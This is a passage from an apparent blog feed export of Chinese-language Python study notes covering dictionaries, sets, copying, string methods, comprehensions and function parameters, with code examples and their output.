<li>如果该 key 不存在，那么先为该 key 设置默认的 defaultvalue，然后再返回该 key 对应的 defaultvalue</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = &#123;<span class="string">'math'</span>: <span class="number">95</span>, <span class="string">'chinese'</span>: <span class="number">89</span>, <span class="string">'english'</span>: <span class="number">90</span>&#125;</span><br><span class="line">print(a)</span><br><span class="line"><span class="comment"># key不存在，指定默认值</span></span><br><span class="line">a.setdefault(<span class="string">'php'</span>, <span class="number">94</span>)</span><br><span class="line">print(a)</span><br><span class="line"><span class="comment"># key不存在，不指定默认值</span></span><br><span class="line">a.setdefault(<span class="string">'c++'</span>)</span><br><span class="line">print(a)</span><br><span class="line"><span class="comment"># key存在，指定默认值</span></span><br><span class="line">a.setdefault(<span class="string">'math'</span>, <span class="number">100</span>)</span><br><span class="line">print(a)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">&#123;<span class="string">'math'</span>: <span class="number">95</span>, <span class="string">'chinese'</span>: <span class="number">89</span>, <span class="string">'english'</span>: <span class="number">90</span>&#125;</span><br><span class="line">&#123;<span class="string">'math'</span>: <span class="number">95</span>, <span class="string">'chinese'</span>: <span class="number">89</span>, <span class="string">'english'</span>: <span class="number">90</span>, <span class="string">'php'</span>: <span class="number">94</span>&#125;</span><br><span class="line">&#123;<span class="string">'math'</span>: <span class="number">95</span>, <span class="string">'chinese'</span>: <span class="number">89</span>, <span class="string">'english'</span>: <span class="number">90</span>, <span class="string">'php'</span>: <span class="number">94</span>, <span class="string">'c++'</span>: <span class="literal">None</span>&#125;</span><br><span class="line">&#123;<span class="string">'math'</span>: <span class="number">95</span>, <span class="string">'chinese'</span>: <span class="number">89</span>, <span class="string">'english'</span>: <span class="number">90</span>, <span class="string">'php'</span>: <span class="number">94</span>, <span class="string">'c++'</span>: <span class="literal">None</span>&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用字典格式化字符串</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">"a %s"</span> % <span class="string">"b"</span></span><br><span class="line">print(s)</span><br><span class="line">d = &#123;<span class="string">"a"</span>:<span class="string">"1"</span>, <span class="string">"b"</span>:<span class="number">2</span>&#125;</span><br><span class="line">s = <span class="string">"%(a)s== %(b)s=="</span> % d</span><br><span class="line">print(s)</span><br><span class="line"></span><br><span class="line">s = <span class="string">"&#123;0&#125; &#123;1&#125; &#123;2&#125;"</span>.format(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">print(s)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br><span class="line">a b</span><br><span class="line"><span class="number">1</span>== <span class="number">2</span>==</span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span></span><br></pre></td></tr></table></figure>



</li>
</ul>
<h3 id="5、集合-set-可添加删除元素"><a href="#5、集合-set-可添加删除元素" class="headerlink" title="5、集合(set, 可添加删除元素)"></a>5、集合(set, 可添加删除元素)</h3><ul>
<li>添加元素<code>setname.add(element)</code> 删除元素<code>setname.remove(element)</code> 不会抛出KeyError 错误，可以使用 discard() 方法(只是不会抛异常而已)</li>
<li>集合运算</li>
</ul>
<p><img data-src="./%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A72/3.png" alt></p>
<ul>
<li>方法集合</li>
</ul>
<table>
<thead>
<tr>
<th>方法名</th>
<th>语法格式</th>
<th>功能</th>
<th>实例</th>
</tr>
</thead>
<tbody><tr>
<td>add()</td>
<td>set1.add()</td>
<td>向 set1 集合中添加数字、字符串、元组或者布尔类型</td>
<td>&gt;&gt;&gt; set1 = {1,2,3} &gt;&gt;&gt; set1.add((1,2)) &gt;&gt;&gt; set1 {(1, 2), 1, 2, 3}</td>
</tr>
<tr>
<td>clear()</td>
<td>set1.clear()</td>
<td>清空 set1 集合中所有元素</td>
<td>&gt;&gt;&gt; set1 = {1,2,3} &gt;&gt;&gt; set1.clear() &gt;&gt;&gt; set1 set()  set()才表示空集合，{}表示的是空字典</td>
</tr>
<tr>
<td>copy()</td>
<td>set2 = set1.copy()</td>
<td>拷贝 set1 集合给 set2</td>
<td>&gt;&gt;&gt; set1 = {1,2,3} &gt;&gt;&gt; set2 = set1.copy() &gt;&gt;&gt; set1.add(4) &gt;&gt;&gt; set1 {1, 2, 3, 4} &gt;&gt;&gt; set1 {1, 2, 3}</td>
</tr>
<tr>
<td>difference()</td>
<td>set3 = set1.difference(set2)</td>
<td>将 set1 中有而 set2 没有的元素给 set3</td>
<td>&gt;&gt;&gt; set1 = {1,2,3} &gt;&gt;&gt; set2 = {3,4} &gt;&gt;&gt; set3 = set1.difference(set2) &gt;&gt;&gt; set3 {1, 2}</td>
</tr>
<tr>
<td>difference_update()</td>
<td>set1.difference_update(set2)</td>
<td>从 set1 中删除与 set2 相同的元素</td>
<td>&gt;&gt;&gt; set1 = {1,2,3} &gt;&gt;&gt; set2 = {3,4} &gt;&gt;&gt; set1.difference_update(set2) &gt;&gt;&gt; set1 {1, 2}</td>
</tr>
<tr>
<td>discard()</td>
<td>set1.discard(elem)</td>
<td>删除 set1 中的 elem 元素</td>
<td>&gt;&gt;&gt; set1 = {1,2,3} &gt;&gt;&gt; set1.discard(2) &gt;&gt;&gt; set1 {1, 3} &gt;&gt;&gt; set1.discard(4) {1, 3}</td>
</tr>
<tr>
<td>intersection()</td>
<td>set3 = set1.intersection(set2)</td>
<td>取 set1 和 set2 的交集给 set3</td>
<td>&gt;&gt;&gt; set1 = {1,2,3} &gt;&gt;&gt; set2 = {3,4} &gt;&gt;&gt; set3 = set1.intersection(set2) &gt;&gt;&gt; set3 {3}</td>
</tr>
<tr>
<td>intersection_update()</td>
<td>set1.intersection_update(set2)</td>
<td>取 set1和 set2 的交集，并更新给 set1</td>
<td>&gt;&gt;&gt; set1 = {1,2,3} &gt;&gt;&gt; set2 = {3,4} &gt;&gt;&gt; set1.intersection_update(set2) &gt;&gt;&gt; set1 {3}</td>
</tr>
<tr>
<td>isdisjoint()</td>
<td>set1.isdisjoint(set2)</td>
<td>判断 set1 和 set2 是否没有交集，有交集返回 False；没有交集返回 True</td>
<td>&gt;&gt;&gt; set1 = {1,2,3} &gt;&gt;&gt; set2 = {3,4} &gt;&gt;&gt; set1.isdisjoint(set2) False</td>
</tr>
<tr>
<td>issubset()</td>
<td>set1.issubset(set2)</td>
<td>判断 set1 是否是 set2 的子集</td>
<td>&gt;&gt;&gt; set1 = {1,2,3} &gt;&gt;&gt; set2 = {1,2} &gt;&gt;&gt; set1.issubset(set2) False</td>
</tr>
<tr>
<td>issuperset()</td>
<td>set1.issuperset(set2)</td>
<td>判断 set2 是否是 set1 的子集</td>
<td>&gt;&gt;&gt; set1 = {1,2,3} &gt;&gt;&gt; set2 = {1,2} &gt;&gt;&gt; set1.issuperset(set2) True</td>
</tr>
<tr>
<td>pop()</td>
<td>a = set1.pop()</td>
<td>取 set1 中一个元素，并赋值给 a</td>
<td>&gt;&gt;&gt; set1 = {1,2,3} &gt;&gt;&gt; a = set1.pop() &gt;&gt;&gt; set1 {2,3} &gt;&gt;&gt; a 1</td>
</tr>
<tr>
<td>remove()</td>
<td>set1.remove(elem)</td>
<td>移除 set1 中的 elem 元素</td>
<td>&gt;&gt;&gt; set1 = {1,2,3} &gt;&gt;&gt; set1.remove(2) &gt;&gt;&gt; set1 {1, 3} &gt;&gt;&gt; set1.remove(4) Traceback (most recent call last):  File “&lt;pyshell#90&gt;”, line 1, in <module>   set1.remove(4) KeyError: 4</module></td>
</tr>
<tr>
<td>symmetric_difference()</td>
<td>set3 = set1.symmetric_difference(set2)</td>
<td>取 set1 和 set2 中互不相同的元素，给 set3</td>
<td>&gt;&gt;&gt; set1 = {1,2,3} &gt;&gt;&gt; set2 = {3,4} &gt;&gt;&gt; set3 = set1.symmetric_difference(set2) &gt;&gt;&gt; set3 {1, 2, 4}</td>
</tr>
<tr>
<td>symmetric_difference_update()</td>
<td>set1.symmetric_difference_update(set2)</td>
<td>取 set1 和 set2 中互不相同的元素，并更新给 set1</td>
<td>&gt;&gt;&gt; set1 = {1,2,3} &gt;&gt;&gt; set2 = {3,4} &gt;&gt;&gt; set1.symmetric_difference_update(set2) &gt;&gt;&gt; set1 {1, 2, 4}</td>
</tr>
<tr>
<td>union()</td>
<td>set3 = set1.union(set2)</td>
<td>取 set1 和 set2 的并集，赋给 set3</td>
<td>&gt;&gt;&gt; set1 = {1,2,3} &gt;&gt;&gt; set2 = {3,4} &gt;&gt;&gt; set3=set1.union(set2) &gt;&gt;&gt; set3 {1, 2, 3, 4}</td>
</tr>
<tr>
<td>update()</td>
<td>set1.update(elem)</td>
<td>添加列表或集合中的元素到 set1</td>
<td>&gt;&gt;&gt; set1 = {1,2,3} &gt;&gt;&gt; set1.update([3,4]) &gt;&gt;&gt; set1 {1,2,3,4}</td>
</tr>
</tbody></table>
<h3 id="6、集合-frozenset-可添加删除元素"><a href="#6、集合-frozenset-可添加删除元素" class="headerlink" title="6、集合(frozenset, 可添加删除元素)"></a>6、集合(frozenset, 可添加删除元素)</h3><ul>
<li>当集合元素不需要改变时，建议使用frozenset，更加安全</li>
<li>有些地方要求对象为不变(字典的key 和 set中的元素等等)</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 内存占用并没有差异</span></span><br><span class="line">f_s = frozenset()</span><br><span class="line">s = set()</span><br><span class="line">print(f_s.__sizeof__())</span><br><span class="line">print(s.__sizeof__())</span><br></pre></td></tr></table></figure>

<h3 id="7、浅拷贝-amp-amp-深拷贝"><a href="#7、浅拷贝-amp-amp-深拷贝" class="headerlink" title="7、浅拷贝&amp;&amp;深拷贝"></a>7、浅拷贝&amp;&amp;深拷贝</h3><ul>
<li><p>浅拷贝，指的是重新分配一块内存，创建一个新的对象，但里面的元素是原对象中各个子对象的引用</p>
</li>
<li><p>深拷贝，是指重新分配一块内存，创建一个新的对象，并且将原对象中的元素，以递归的方式，通过创建新的子对象拷贝到新对象中</p>
</li>
<li><p>深度拷贝问题。如果被拷贝对象中存在指向自身的引用，那么程序很容易陷入无限循环，深度拷贝函数 deepcopy 中会维护一个字典，记录已经拷贝的对象与其 ID。拷贝过程中，如果字典里已经存储了将要拷贝的对象，则会从字典直接返回(具体可以看下源码)</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> copy</span><br><span class="line">list1 = [<span class="number">1</span>]</span><br><span class="line">list1.append(list1)</span><br><span class="line">print(list1)</span><br><span class="line">list2 = copy.deepcopy(list1)</span><br><span class="line">print(list2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># -------------------------------------------------------</span></span><br><span class="line"><span class="comment"># cpython 源码</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deepcopy</span><span class="params">(x, memo=None, _nil=[])</span>:</span></span><br><span class="line">    <span class="string">"""Deep copy operation on arbitrary Python objects.</span></span><br><span class="line"><span class="string">       </span></span><br><span class="line"><span class="string">    See the module's __doc__ string for more info.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">   </span><br><span class="line">    <span class="keyword">if</span> memo <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        memo = &#123;&#125;</span><br><span class="line">    d = id(x) <span class="comment"># 查询被拷贝对象 x 的 id</span></span><br><span class="line">    y = memo.get(d, _nil) <span class="comment"># 查询字典里是否已经存储了该对象</span></span><br><span class="line">    <span class="keyword">if</span> y <span class="keyword">is</span> <span class="keyword">not</span> _nil:</span><br><span class="line">        <span class="keyword">return</span> y <span class="comment"># 如果字典里已经存储了将要拷贝的对象，则直接返回</span></span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>奇淫</tag>
        <tag>python列表、元组、字典和集合</tag>
      </tags>
  </entry>
  <entry>
    <title>python自我补充3</title>
    <url>/2020/03/06/blog_formal/%E5%BC%80%E5%8F%91/python/%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A73/</url>
    <content><![CDATA[<h1 id="python-奇淫3"><a href="#python-奇淫3" class="headerlink" title="python 奇淫3"></a>python 奇淫3</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>这个系列主要收录python的一些不常用知识点</p>
<a id="more"></a>

<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="1、转换成字符串"><a href="#1、转换成字符串" class="headerlink" title="1、转换成字符串"></a>1、转换成字符串</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># str repr的区别</span></span><br><span class="line">s = <span class="string">"www.caixin.com"</span></span><br><span class="line"></span><br><span class="line">s_str = str(s)</span><br><span class="line">s_repr = repr(s)</span><br><span class="line"></span><br><span class="line">print(type(s_str))</span><br><span class="line">print(s_str)</span><br><span class="line">print(type(s_repr))</span><br><span class="line">print(s_repr)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">str</span>'&gt;</span></span><br><span class="line"><span class="class"><span class="title">www</span>.<span class="title">caixin</span>.<span class="title">com</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> '<span class="title">str</span>'&gt;</span></span><br><span class="line"><span class="class">'<span class="title">www</span>.<span class="title">caixin</span>.<span class="title">com</span>'</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"># 备注 在<span class="title">Python</span>交互式编程环境中输入一个表达式（变量、加减乘除、逻辑运算等）时，<span class="title">Python</span>会自动使用 <span class="title">repr</span><span class="params">()</span> 函数处理该表达式</span></span><br></pre></td></tr></table></figure>

<h3 id="2、字符串len方法"><a href="#2、字符串len方法" class="headerlink" title="2、字符串len方法"></a>2、字符串len方法</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">"人生苦短，python大法"</span></span><br><span class="line"></span><br><span class="line">print(len(s))  <span class="comment"># 字符串长度</span></span><br><span class="line">print(len(s.encode(<span class="string">'utf-8'</span>)))  <span class="comment"># 编码成 utf-8 后的字节数</span></span><br><span class="line">print(len(s.encode(<span class="string">'gbk'</span>)))  <span class="comment"># 编码成 gbk 后的字节数</span></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"><span class="number">13</span></span><br><span class="line"><span class="number">27</span></span><br><span class="line"><span class="number">20</span></span><br></pre></td></tr></table></figure>

<h3 id="3、字符串一些方法"><a href="#3、字符串一些方法" class="headerlink" title="3、字符串一些方法"></a>3、字符串一些方法</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">str.split(sep,maxsplit)  <span class="comment"># 切分字符串</span></span><br><span class="line">newstr = str.join(iterable)  <span class="comment"># 合并字符串</span></span><br><span class="line">str.count(sub[,start[,end]])  <span class="comment"># 统计字符串出现个数</span></span><br><span class="line">str.find(sub[,start[,end]])  <span class="comment"># 查找字符串 rfind() 从右侧反向查找 如果查找不到 返回-1</span></span><br><span class="line">str.index(sub[,start[,end]])  <span class="comment"># 查找字符串 不同find方法在于，当指定的字符串不存在时，index()方法会抛出异常</span></span><br><span class="line">str.startswith(sub[,start[,end]]) str.endswith(sub[,start[,end]])  <span class="comment"># 字符串是否已 某个字符串开头和结尾</span></span><br><span class="line">str.title()  <span class="comment"># 首字母大写 其余小写</span></span><br><span class="line">str.lower()  str.upper()  <span class="comment"># 字符串转小写 转大写 </span></span><br><span class="line">S.ljust(width[, fillchar])  S.rjust(width[, fillchar])  S.center(width[, fillchar])  <span class="comment"># 左对齐 右对齐 居中</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 特殊字符，指的是制表符（\t）、回车符（\r）、换行符（\n）等</span></span><br><span class="line">str.strip([chars])  <span class="comment"># 删除字符串前后（左右两侧）的空格或特殊字符</span></span><br><span class="line">str.lstrip([chars])  <span class="comment"># 删除字符串前面（左边）的空格或特殊字符</span></span><br><span class="line">str.rstrip([chars])  <span class="comment"># 删除字符串后面（右边）的空格或特殊字符</span></span><br></pre></td></tr></table></figure>

<ul>
<li>encode <code>str.encode([encoding=&quot;utf-8&quot;][,errors=&quot;strict&quot;])</code></li>
</ul>
<table>
<thead>
<tr>
<th>参数</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>str</td>
<td>表示要进行转换的字符串。</td>
</tr>
<tr>
<td>encoding = “utf-8”</td>
<td>指定进行编码时采用的字符编码，该选项默认采用 utf-8 编码。例如，如果想使用简体中文，可以设置 gb2312。  当方法中只使用这一个参数时，可以省略前边的“encoding=”，直接写编码格式，例如 str.encode(“UTF-8”)。</td>
</tr>
<tr>
<td>errors = “strict”</td>
<td>指定错误处理方式，其可选择值可以是：strict：遇到非法字符就抛出异常。ignore：忽略非法字符。replace：用“？”替换非法字符。xmlcharrefreplace：使用 xml 的字符引用。该参数的默认值为 strict。</td>
</tr>
</tbody></table>
<ul>
<li>decode <code>bytes.decode([encoding=&quot;utf-8&quot;][,errors=&quot;strict&quot;])</code></li>
</ul>
<table>
<thead>
<tr>
<th>参数</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>bytes</td>
<td>表示要进行转换的二进制数据。</td>
</tr>
<tr>
<td>encoding=”utf-8”</td>
<td>指定解码时采用的字符编码，默认采用 utf-8 格式。当方法中只使用这一个参数时，可以省略“encoding=”，直接写编码方式即可。  注意，对 bytes 类型数据解码，要选择和当初编码时一样的格式。</td>
</tr>
<tr>
<td>errors = “strict”</td>
<td>指定错误处理方式，其可选择值可以是：strict：遇到非法字符就抛出异常。ignore：忽略非法字符。replace：用“？”替换非法字符。xmlcharrefreplace：使用 xml 的字符引用。该参数的默认值为 strict。</td>
</tr>
</tbody></table>
<ul>
<li>dir() 函数用来列出某个类或者某个模块中的全部内容，包括变量、方法、函数和类等</li>
<li>help() 函数用来查看某个函数或者模块的帮助文档</li>
</ul>
<h3 id="4、assert-方法"><a href="#4、assert-方法" class="headerlink" title="4、assert 方法"></a>4、assert 方法</h3><p><code>assert 表达式</code> 当 assert 语句后的表达式值为真时，程序继续执行；反之，程序停止执行，并报 AssertionError 错误，assert是可以被取消的(工程不建议使用，用 <code>if</code>判断很香了)</p>
<h3 id="5、一些推导式"><a href="#5、一些推导式" class="headerlink" title="5、一些推导式"></a>5、一些推导式</h3><ul>
<li>列表推导式 <code>[表达式 for 迭代变量 in 可迭代对象 [if 条件表达式] ] eg: a = [x for x in range(10)]</code></li>
<li>元组推导式 <code>(表达式 for 迭代变量 in 可迭代对象 [if 条件表达式] ) eg: a = (x for x in range(10))</code></li>
<li>集合推导式 <code>{ 表达式 for 迭代变量 in 可迭代对象 [if 条件表达式] } eg: newdict = {key:len(key) for key in listdemo}</code></li>
<li>字典推导式 <code>{表达式 for 迭代变量 in 可迭代对象 [if 条件表达式]} eg: setnew = {i**2 **for** i **in** range(3)}</code>  </li>
</ul>
<h3 id="6、zip"><a href="#6、zip" class="headerlink" title="6、zip"></a>6、zip</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># zip() 函数是 Python 内置函数之一，它可以将多个序列（列表、元组、字典、集合、字符串以及 range() 区间构成的列表）“压缩”成一个 zip 对象。所谓“压缩”，其实就是将这些序列中对应位置的元素重新组合，生成一个个新的元组</span></span><br><span class="line"><span class="comment"># 和 Python 3.x 版本不同，Python 2.x 版本中的 zip() 函数会直接返回列表，而不是返回 zip 对象 </span></span><br><span class="line"><span class="comment"># 2.x 3.x 包含的元素(都是元组) 是相同的</span></span><br><span class="line"><span class="comment"># 不一致 少的为准</span></span><br><span class="line">my_list = [<span class="number">11</span>,<span class="number">12</span>]</span><br><span class="line">my_tuple = (<span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> zip(my_list, my_tuple):</span><br><span class="line">    print(i)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">(<span class="number">11</span>, <span class="number">21</span>)</span><br><span class="line">(<span class="number">12</span>, <span class="number">22</span>)</span><br></pre></td></tr></table></figure>

<h3 id="7、reversed"><a href="#7、reversed" class="headerlink" title="7、reversed"></a>7、reversed</h3><ul>
<li>reversed() 函数进行逆序操作(不会修改原来序列中元素的顺序,需要用新的对象接收)</li>
</ul>
<h3 id="8、sorted"><a href="#8、sorted" class="headerlink" title="8、sorted"></a>8、sorted</h3><ul>
<li>排序函数: 功能是对序列（列表、元组、字典、集合、还包括字符串）进行排序</li>
<li><code>list = sorted(iterable, key=None, reverse=False)</code></li>
</ul>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>奇淫</tag>
        <tag>python字符串&amp;&amp;流程控制</tag>
      </tags>
  </entry>
  <entry>
    <title>python自我补充4</title>
    <url>/2020/03/09/blog_formal/%E5%BC%80%E5%8F%91/python/%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A74/</url>
    <content><![CDATA[<h1 id="python-奇淫4"><a href="#python-奇淫4" class="headerlink" title="python 奇淫4"></a>python 奇淫4</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>这个系列主要收录python的一些不常用知识点</p>
<a id="more"></a>

<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="1、为函数提供文档"><a href="#1、为函数提供文档" class="headerlink" title="1、为函数提供文档"></a>1、为函数提供文档</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuc_test</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    xxxxxxxx</span></span><br><span class="line"><span class="string">    文档是 xxxxx</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">help(fuc_test)</span><br><span class="line">print(<span class="string">"----------------------"</span>)</span><br><span class="line">print(fuc_test.__doc__)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">Help on function fuc_test <span class="keyword">in</span> module __main__:                                                                                                                                                                                                                         </span><br><span class="line"></span><br><span class="line">fuc_test()</span><br><span class="line">    xxxxxxxx</span><br><span class="line">    文档是 xxxxx</span><br><span class="line"></span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">    xxxxxxxx</span><br><span class="line">    文档是 xxxxx</span><br></pre></td></tr></table></figure>

<h3 id="2、函数参数"><a href="#2、函数参数" class="headerlink" title="2、函数参数"></a>2、函数参数</h3><ul>
<li>python中，根据实际参数类型的不同，函数参数传递分为两种<ul>
<li>值传递: 实参类型为不可变类型（字符串、数字、元组）–形参发生变化，不影响实参的值</li>
<li>引用(地址)传递: 实参类型为可变类型（列表，字典）–形参发生变化，影响实参的值</li>
<li>所以，想要在函数中修改某些数据，可以通过这个数据包装成列表，字典等可变对象传入函数修改</li>
</ul>
</li>
<li>位置参数，就是最简单的参数</li>
<li>关键字参数，是指使用形式参数的名字来确定输入的参数值。通过此方式指定函数实参时，不再需要与形参的位置完全一致，只要将参数名写正确即可，规定必须放在位置参数之后</li>
<li>默认参数，当定义一个有默认值参数的函数时，有默认值的参数必须位于所有没默认值参数的后面。 <code>函数名.__defaults__</code>获取函数默认参数</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_default</span><span class="params">(a = <span class="number">1</span>)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">print(test_default.__defaults__)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">(<span class="number">1</span>,)</span><br></pre></td></tr></table></figure>

<ul>
<li>传递多个参数<ul>
<li><code>*args</code> 表示创建一个名为 args 的空元组，该元组可接受任意多个外界传入的非关键字实参</li>
<li><code>**kwargs</code>表示创建一个名为 kwargs 的空字典，该字典可以接收任意多个以关键字参数赋值的实际参数</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_func</span><span class="params">(a, *args, **kwargs)</span>:</span></span><br><span class="line">    print(a)</span><br><span class="line">    print(args)</span><br><span class="line">    print(kwargs)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">test_func(<span class="string">"aaa"</span>, <span class="string">"bbb"</span>, <span class="string">"ccc"</span>, ddd = <span class="string">"ddd"</span>, eee = <span class="string">"eee"</span>)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">aaa</span><br><span class="line">(<span class="string">'bbb'</span>, <span class="string">'ccc'</span>)</span><br><span class="line">&#123;<span class="string">'ddd'</span>: <span class="string">'ddd'</span>, <span class="string">'eee'</span>: <span class="string">'eee'</span>&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>逆向参数收集，直接将列表、元组、字典作为函数参数，Python 会将其进行拆分，把其中存储的元素按照次序分给函数中的各个形参。在以逆向参数收集的方式向函数参数传值时，Pyhon 语法规定，当传入列表或元组时，其名称前要带一个 * 号，当传入字典时，其名称前要带有 2 个 * 号</li>
</ul>
<h3 id="3、函数返回值-多个"><a href="#3、函数返回值-多个" class="headerlink" title="3、函数返回值(多个)"></a>3、函数返回值(多个)</h3><ul>
<li>在函数中，提前将要返回的多个值存储到一个列表或元组中，然后函数返回该列表或元组</li>
<li>函数直接返回多个值，之间用逗号（ , ）分隔，Python 会自动将多个值封装到一个元组中，其返回值仍是一个元组</li>
</ul>
<h3 id="4、偏函数"><a href="#4、偏函数" class="headerlink" title="4、偏函数"></a>4、偏函数</h3><ul>
<li><code>偏函数名 = partial(func, *args, **kwargs)</code>  –func 指的是要封装的原函数，<em>args 和 *</em>kwargs 分别用于接收无关键字实参和关键字实参</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> partial</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">display_person</span><span class="params">(name, age)</span>:</span></span><br><span class="line">    print(<span class="string">"name = &#123;0&#125; age = &#123;1&#125;"</span>.format(name, age))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">display_bob = partial(display_person, name = <span class="string">"bob"</span>)</span><br><span class="line">display_person(name = <span class="string">"Bob"</span>, age = <span class="number">15</span>)</span><br><span class="line">display_bob(age = <span class="number">15</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_mod</span><span class="params">(m , n)</span>:</span></span><br><span class="line">    print(m % n)</span><br><span class="line"></span><br><span class="line">my_mod_by_1000 = partial(my_mod, <span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line">my_mod(<span class="number">1000</span>, <span class="number">99</span>)</span><br><span class="line">my_mod_by_1000(<span class="number">99</span>)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">name = Bob age = <span class="number">15</span></span><br><span class="line">name = bob age = <span class="number">15</span></span><br><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">10</span></span><br></pre></td></tr></table></figure>

<ul>
<li>偏函数的本质是将函数式编程、默认参数和冗余参数结合在一起，通过偏函数传入的参数调用关系，与正常函数的参数调用关系是一致的</li>
<li>偏函数通过将任意数量（顺序）的参数，转化为另一个带有剩余参数的函数对象，从而实现了截取函数功能（偏向）的效果</li>
<li>可以使用一个原函数，然后将其封装多个偏函数，在调用函数时全部调用偏函数，一定程序上可以提高程序的可读性（并不这么认为）</li>
</ul>
<h3 id="5、变量作用域"><a href="#5、变量作用域" class="headerlink" title="5、变量作用域"></a>5、变量作用域</h3><ul>
<li>获取指定作用域范围中的变量<ul>
<li><code>globals() 函数</code>为 Python 的内置函数，它可以返回一个包含全局范围内所有变量的字典，该字典中的每个键值对，键为变量名，值为该变量的值</li>
<li><code>locals() 函数</code>也是 Python 内置函数之一，通过调用该函数，我们可以得到一个包含当前作用域内所有变量的字典。所谓的“当前作用域”指的是，在函数内部调用 locals() 函数，会获得包含所有局部变量的字典；而在全局范文内调用 locals() 函数，其功能和 globals() 函数相同</li>
<li><code>vars() vars(object)函数</code>是 Python 内置函数，其功能是返回一个指定 object 对象范围内所有变量组成的字典。如果不传入object 参数，vars() 和 locals() 的作用完全相同</li>
</ul>
</li>
<li>局部函数</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 全局函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">outdef</span> <span class="params">()</span>:</span></span><br><span class="line">    name = <span class="string">"所在函数中定义的 name 变量"</span></span><br><span class="line">    <span class="comment"># 局部函数</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">indef</span><span class="params">()</span>:</span></span><br><span class="line">        print(name)</span><br><span class="line">        name = <span class="string">"局部函数中定义的 name 变量"</span></span><br><span class="line">    indef()</span><br><span class="line"><span class="comment"># 调用全局函数</span></span><br><span class="line">outdef()</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">......</span><br><span class="line">    print(name)</span><br><span class="line">UnboundLocalError: local variable <span class="string">'name'</span> referenced before assignment</span><br><span class="line"></span><br><span class="line"><span class="comment"># 之前 globals 的方法在这里是不适用的 修改如下</span></span><br><span class="line"><span class="comment"># 全局函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">outdef</span> <span class="params">()</span>:</span></span><br><span class="line">    name = <span class="string">"所在函数中定义的 name 变量"</span></span><br><span class="line">    <span class="comment"># 局部函数</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span 